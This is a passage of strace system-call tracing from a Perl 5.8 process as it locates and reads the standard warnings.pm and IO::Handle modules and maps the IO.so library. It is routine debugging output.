10104 20:03:03.113844 stat64("/usr/local/share/perl/5.8.8/warnings.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.113857 stat64("/usr/local/share/perl/5.8.8/warnings.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.113876 stat64("/usr/lib/perl5/warnings.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.113888 stat64("/usr/lib/perl5/warnings.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.113902 stat64("/usr/share/perl5/warnings.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.113914 stat64("/usr/share/perl5/warnings.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.113928 stat64("/usr/lib/perl/5.8/warnings.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.113941 stat64("/usr/lib/perl/5.8/warnings.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.113955 stat64("/usr/share/perl/5.8/warnings.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.113969 stat64("/usr/share/perl/5.8/warnings.pm", {st_mode=S_IFREG|0644, st_size=13018, ...}) = 0
10104 20:03:03.113991 open("/usr/share/perl/5.8/warnings.pm", O_RDONLY|O_LARGEFILE) = 8
10104 20:03:03.114006 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa44008) = -1 ENOTTY (Inappropriate ioctl for device)
10104 20:03:03.114018 _llseek(8, 0, [0], SEEK_CUR) = 0
10104 20:03:03.114037 read(8, "# -*- buffer-read-only: t -*-\n# !!!!!!!   DO NOT EDIT THIS FILE   !!!!!!!\n# This file was created by warnings.pl\n# Any changes made here will be lost.\n#\n\npackage warnings;\n\nour $VERSION = \'1.05\';\n\nuse Carp ();\n\nour %Offsets = (\n\n    # Warnings Categories added in Perl 5.008\n\n    \'all\'\t\t=> 0,\n    \'closure\'\t\t=> 2,\n    \'deprecated\'\t=> 4,\n    \'exiting\'\t\t=> 6,\n    \'glob\'\t\t=> 8,\n    \'io\'\t\t=> 10,\n    \'closed\'\t\t=> 12,\n    \'exec\'\t\t=> 14,\n    \'layer\'\t\t=> 16,\n    \'newline\'\t\t=> 18,\n    \'pipe\'\t\t=> 20,\n    \'unopened\'\t\t=> 22,\n    \'misc\'\t\t=> 24,\n    \'numeric\'\t\t=> 26,\n    \'once\'\t\t=> 28,\n    \'overflow\'\t\t=> 30,\n    \'pack\'\t\t=> 32,\n    \'portable\'\t\t=> 34,\n    \'recursion\'\t\t=> 36,\n    \'redefine\'\t\t=> 38,\n    \'regexp\'\t\t=> 40,\n    \'severe\'\t\t=> 42,\n    \'debugging\'\t\t=> 44,\n    \'inplace\'\t\t=> 46,\n    \'internal\'\t\t=> 48,\n    \'malloc\'\t\t=> 50,\n    \'signal\'\t\t=> 52,\n    \'substr\'\t\t=> 54,\n    \'syntax\'\t\t=> 56,\n    \'ambiguous\'\t\t=> 58,\n    \'bareword\'\t\t=> 60,\n    \'digit\'\t\t=> 62,\n    \'parenthesis\'\t=> 64,\n    \'precedence\'\t=> 66,\n    \'printf\'\t\t=> 68,\n    \'prototype\'\t\t=> 70,\n    \'qw\'\t\t=> 72,\n    \'reserved\'\t\t=> 74,\n    \'semicolon\'\t\t=> 76,\n    \'taint\'\t\t=> 78,\n    \'threads\'\t\t=> 80,\n    \'uninitialized\'\t=> 82,\n    \'unpack\'\t\t=> 84,\n    \'untie\'\t\t=> 86,\n    \'utf8\'\t\t=> 88,\n    \'void\'\t\t=> 90,\n    \'y2k\'\t\t=> 92,\n  );\n\nour %Bits = (\n    \'all\'\t\t=> \"\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x15\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\x54\\x55\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x54\\x05\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x40", 4096) = 4096
10104 20:03:03.114470 brk(0x81b6000)    = 0x81b6000
10104 20:03:03.114487 brk(0x81b5000)    = 0x81b5000
10104 20:03:03.114569 read(8, "\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x55\\x55\\x15\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\", # [46]\n  );\n\nour %DeadBits = (\n    \'all\'\t\t=> \"\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\x2a\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\xa8\\xaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\xa8\\x0a\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xaa\\xaa\\x2a\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\", 4096) = 4096
10104 20:03:03.115244 read(8, "x00\\x20\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\", # [46]\n  );\n\n$NONE     = \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\";\n$LAST_BIT = 94 ;\n$BYTES    = 12 ;\n\n$All = \"\" ; vec($All, $Offsets{\'all\'}, 2) = 3 ;\n\nsub Croaker\n{\n    local $Carp::CarpInternal{\'warnings\'};\n    delete $Carp::CarpInternal{\'warnings\'};\n    Carp::croak(@_);\n}\n\nsub bits\n{\n    # called from B::Deparse.pm\n\n    push @_, \'all\' unless @_;\n\n    my $mask;\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    return $mask ;\n}\n\nsub import \n{\n    shift;\n\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n    \n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nsub unimport \n{\n    shift;\n\n    my $catmask ;\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n\n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    next; \n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask &= ~($catmask | $DeadBits{$word} | $All);\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nmy %builtin_type; @builtin_type{qw(SCALAR ARRAY HASH CODE REF GLOB LVALUE Regexp)} = ();\n\nsub __chk\n{\n    my $category ;\n    my $offset ;\n    my $isobj = 0 ;\n\n    if (@_) {\n        # check the category supplied.\n        $category = shift ;\n        if (my $type = ref $category) {\n            Croaker(\"not an object\")\n                if exists $builtin_type{$type};\n\t    $category = $type;\n            $isobj = 1 ;\n        }\n        $offset = $Offsets{$category};\n        Croaker(\"Unknown warnings category \'$category\'\")\n\t    unless defined $offset;\n    }\n    else {\n        $category = (caller(1))[0] ;\n        $offset = $Offsets{$category};\n        Croaker(\"package \'$category\' not registered for warnings\")\n\t    unless defined $offset ;\n    }\n\n    my $this_pkg = (caller(1))[0] ;\n    my $i = 2 ;\n    my $pkg ;\n\n    if ($isobj) {\n        while (do { { package DB; $pkg = (caller($i++))[0] } } ) {\n            last unless @DB::args && $DB::args[0] =~ /^$category=/ ;\n        }\n\t$i -= 2 ;\n    }\n    else {\n        for ($i = 2 ; $pkg = (caller($i))[0] ; ++ $i) {\n            last if $pkg ne $this_pkg ;\n        }\n        $i = 2\n            if !$pkg || $pkg eq $this_pkg ;\n    }\n\n    my $callers_bitmask = (caller($i))[9] ;\n    return ($callers_bitmask, $offset, $i) ;\n}\n\nsub enabled\n{\n    Croaker(\"Usage: warnings::enabled([category])\")\n\tunless @_ == 1 || @_ == 0 ;\n\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return 0 unless defined $callers_bitmask ;\n    return vec($callers_bitmask, $offset, 1) ||\n           vec($callers_bitmask, $Offsets{\'all\'}, 1) ;\n}\n\nsub warn\n{\n    Croaker(\"Usage: warnings::warn([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $me", 4096) = 4096
10104 20:03:03.115968 read(8, "ssage = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n    Carp::carp($message) ;\n}\n\nsub warnif\n{\n    Croaker(\"Usage: warnings::warnif([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $message = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return\n        unless defined $callers_bitmask &&\n            \t(vec($callers_bitmask, $offset, 1) ||\n            \tvec($callers_bitmask, $Offsets{\'all\'}, 1)) ;\n\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n\n    Carp::carp($message) ;\n}\n\n1;\n# ex: set ro:\n", 4096) = 730
10104 20:03:03.117203 read(8, "", 4096) = 0
10104 20:03:03.117203 close(8)          = 0
10104 20:03:03.117245 _llseek(6, 412, [412], SEEK_SET) = 0
10104 20:03:03.117262 _llseek(6, 0, [412], SEEK_CUR) = 0
10104 20:03:03.117272 close(6)          = 0
10104 20:03:03.117315 stat64("/usr/lib/perl/5.8/auto/IO/IO.so", {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
10104 20:03:03.117381 stat64("/usr/lib/perl/5.8/auto/IO/IO.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
10104 20:03:03.117425 futex(0xb7f89070, 0x81 /* FUTEX_??? */, 2147483647) = 0
10104 20:03:03.117443 open("/usr/lib/perl/5.8/auto/IO/IO.so", O_RDONLY) = 6
10104 20:03:03.117458 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\22\0\0004\0\0\0\0349\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\2006\0\0\2006\0\0\5\0\0\0\0\20\0\0\1\0\0\0\2006\0\0\200F\0\0\200F\0\0\360\1\0\0\364\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\2246\0\0\224F\0\0\224F\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0C\0\0\0E\0\0\0\0\0\0\0\t\0\0\0\3\0\0\0D\0\0\0\"\0\0\0009\0\0\0\0\0\0\0#\0\0\0\0\0\0\0%\0\0\0:\0\0\0\4\0\0\0001\0\0\0\37\0\0\0;\0\0\0\30\0\0\0+\0\0\0\23\0\0\0\n\0\0\0000\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\16\0\0\0\0\0\0\0004\0\0\0\0\0\0\0\0\0\0\0008\0\0\0\32\0\0\0\0\0\0\0\0\0\0\0?\0\0\0)\0\0\0\10\0\0\0.\0\0\0\26\0\0\0!\0\0\0\21\0\0\0(\0\0\0&\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0\0\0\0\0\0\0\0\0$\0\0\0006\0\0\0\24\0\0\0A\0\0\0\0\0\0\0\27\0\0\0@\0\0\0\0\0\0\0\5\0\0\0\0\0\0\0\0\0\0\0\33\0\0\0\17\0\0\0002\0\0\0\22\0\0\0>\0\0\0\'\0\0\0\36\0\0\0*\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\7\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
10104 20:03:03.117548 fstat64(6, {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
10104 20:03:03.117574 mmap2(NULL, 18548, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7f8d000
10104 20:03:03.117588 mmap2(0xb7f91000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x3) = 0xb7f91000
10104 20:03:03.117603 close(6)          = 0
10104 20:03:03.117735 stat64("/etc/perl/IO/Handle.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:03.117752 stat64("/etc/perl/IO/Handle.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:03.117767 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:03.117780 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:03.117794 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:03.117807 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:03.117832 stat64("/usr/lib/perl5/IO/Handle.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:03.117872 stat64("/usr/lib/perl5/IO/Handle.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:03.117886 stat64("/usr/share/perl5/IO/Handle.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:03.117916 stat64("/usr/share/perl5/IO/Handle.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:03.117929 stat64("/usr/lib/perl/5.8/IO/Handle.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:03.117943 stat64("/usr/lib/perl/5.8/IO/Handle.pm", {st_mode=S_IFREG|0644, st_size=7592, ...}) = 0
10104 20:03:03.117974 open("/usr/lib/perl/5.8/IO/Handle.pm", O_RDONLY|O_LARGEFILE) = 6
10104 20:03:03.117990 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa444b8) = -1 ENOTTY (Inappropriate ioctl for device)
10104 20:03:03.118006 _llseek(6, 0, [0], SEEK_CUR) = 0
10104 20:03:03.118023 read(6, "package IO::Handle;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO ();\t# Load the XS module\n\nrequire Exporter;\n@ISA = qw(Exporter);\n\n$VERSION = \"1.25\";\n$VERSION = eval $VERSION;\n\n@EXPORT_OK = qw(\n    autoflush\n    output_field_separator\n    output_record_separator\n    input_record_separator\n    input_line_number\n    format_page_number\n    format_lines_per_page\n    format_lines_left\n    format_name\n    format_top_name\n    format_line_break_characters\n    format_formfeed\n    format_write\n\n    print\n    printf\n    getline\n    getlines\n\n    printflush\n    flush\n\n    SEEK_SET\n    SEEK_CUR\n    SEEK_END\n    _IOFBF\n    _IOLBF\n    _IONBF\n);\n\n################################################\n## Constructors, destructors.\n##\n\nsub new {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 1 or croak \"usage: new $class\";\n    my $io = gensym;\n    bless $io, $class;\n}\n\nsub new_from_fd {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 3 or croak \"usage: new_from_fd $class FD, MODE\";\n    my $io = gensym;\n    shift;\n    IO::Handle::fdopen($io, @_)\n\tor return undef;\n    bless $io, $class;\n}\n\n#\n# There is no need for DESTROY to do anything, because when the\n# last reference to an IO object is gone, Perl automatically\n# closes its associated files (if any).  However, to avoid any\n# attempts to autoload DESTROY, we here define it to do nothing.\n#\nsub DESTROY {}\n\n################################################\n## Open and close.\n##\n\nsub _open_mode_string {\n    my ($mode) = @_;\n    $mode =~ /^\\+?(<|>>?)$/\n      or 